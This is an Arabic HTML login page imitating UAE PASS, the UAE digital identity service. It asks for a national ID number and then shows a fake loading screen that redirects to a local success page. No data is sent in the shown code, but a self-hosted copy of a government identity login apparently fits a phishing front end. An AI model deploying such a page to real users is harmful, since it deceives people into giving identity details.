<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - تسجيل الدخول</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* التنسيقات الخاصة بخانة تذكرني */
        .form-options {
            display: flex;
            justify-content: flex-start; /* لضمان البدء من اليمين */
            margin-bottom: 20px;
            width: 100%;
        }

        .form-check {
            display: flex;
            align-items: center;
            gap: 8px; /* المسافة بين النص والمربع */
            cursor: pointer;
        }

        /* تنسيق المربع ولونه */
        #rememberme {
            width: 18px;
            height: 18px;
            cursor: pointer;
            /* تغيير لون الصح والخلفية عند التحديد للأزرق */
            accent-color: #007bff; 
            order: 1; /* لجعل المربع يظهر أولاً من اليمين */
        }

        .checkbox-label {
            font-size: 14px;
            color: #454f63;
            cursor: pointer;
            order: 2; /* لجعل النص يظهر بعد المربع */
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="rectangle"></div>
    
    <div class="main-wrapper">
        <div class="container">
            <header class="header">
                <div class="logo">
                    <img src="self_service.png" alt="UAE Pass Logo">
                </div>
                
                <h1 class="login-to-uaepass">
                    الدخول عن طريق الهوية الرقمية
                </h1>
            </header>
            
            <div id="loadingScreen" style="display: none; text-align: center; padding: 40px 20px;">
                <div style="font-size: 60px; color: #00ac75; margin-bottom: 20px;">
                    <i class="fas fa-spinner fa-spin"></i>
                </div>
                <h2 style="color: #454f63; margin-bottom: 10px;">جاري تسجيل الدخول</h2>
                <p style="color: #78849e;">يرجى الانتظار...</p>
            </div>
            
            <main class="login-content" id="loginContent">
                <form id="loginForm">
                    <div class="form-group">
                        <label class="form-label" for="username">
                            <i class="fas fa-id-card"></i> رقم الهوية
                        </label>
                        <input type="text" 
                               class="form-input" 
                               id="username" 
                               name="username" 
                               placeholder="رقم الهوية، البريد الإلكتروني، أو رقم الهاتف."
                               pattern="\d{15}"
                               maxlength="15"
                               required>
                    </div>
                    
                    <div class="form-options">
                        <div class="form-check">
                            <input type="checkbox" checked id="rememberme" name="rememberme">
                            <label class="checkbox-label" for="rememberme">
                              تذكرني
                            </label>
                        </div>
                    </div>
                    
                    <div class="form-group-button">
                        <button type="submit" class="btn-login" id="submitButton">
                            تسجيل الدخول
                        </button>
                    </div>
                </form>
                
                <div class="divider">
                    <hr class="style">
                    <span class="divider-text">أو</span>
                </div>
                
                <div class="account-actions">
                    <div class="dont-have-account">
                        <span class="account-text">
                            <i class="fas fa-question-circle"></i> ليس لديك حساب؟
                        </span>
                        <a href="https://uaepass.ae/signup" class="create-new-account">
                            <i class="fas fa-user-plus"></i> إنشاء حساب جديد
                        </a>
                    </div>
                    
                    <div class="recover-account">
                        <a href="https://uaepass.ae/account-recovery" class="recover-link">
                            <i class="fas fa-key"></i> كيفية استعادة الحساب؟
                        </a>
                    </div>
                </div>
            </main>
            
            <footer class="footer">
                <div class="footer-links">
                    <a href="https://uaepass.ae/support" class="menu-link">الدعم</a>
                    <span class="menu-separator">|</span>
                    <a href="https://uaepass.ae/faq" class="menu-link">الأسئلة الشائعة</a>
                    <span class="menu-separator">|</span>
                    <a href="https://uaepass.ae/locations" class="menu-link">مواقع منافذ الخدمة</a>
                </div>
                
                <div class="copyright">
                    <i class="fas fa-copyright"></i> حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.
                </div>
            </footer>
        </div>
    </div>

    <script>
        // السكريبت البرمجي الخاص بك يظل كما هو دون تغيير
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const submitButton = document.getElementById('submitButton');
        const loginContent = document.getElementById('loginContent');
        const loadingScreen = document.getElementById('loadingScreen');

        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            const idNumber = usernameInput.value.trim();
            const rememberMe = document.getElementById('rememberme').checked;
            
            loginContent.style.display = 'none';
            loadingScreen.style.display = 'block';
            submitButton.disabled = true;
            
            setTimeout(() => {
                window.location.href = 'success.html?id=' + Date.now();
            }, 2000);
        });

        // استعادة الحالة عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', function() {
            const lastId = localStorage.getItem('last_entered_id');
            if (lastId) {
                usernameInput.value = lastId;
                document.getElementById('rememberme').checked = true;
            }
        });
    </script>
</body>
</html>
